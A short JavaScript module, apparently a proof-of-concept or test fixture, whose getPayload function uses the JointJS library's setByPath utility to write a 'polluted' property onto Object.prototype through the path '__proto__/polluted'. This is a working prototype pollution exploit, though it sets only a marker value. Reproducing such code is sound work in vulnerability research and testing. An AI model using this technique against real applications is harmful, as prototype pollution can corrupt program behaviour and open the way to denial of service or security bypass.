function getPayload() {
    const payload = {};
    // Ensure jointjs is imported here
    const jointjs = require("jointjs");
    jointjs.util.setByPath(payload, "__proto__/polluted", "yes", "/");
    return payload;
}

module.exports = { getPayload };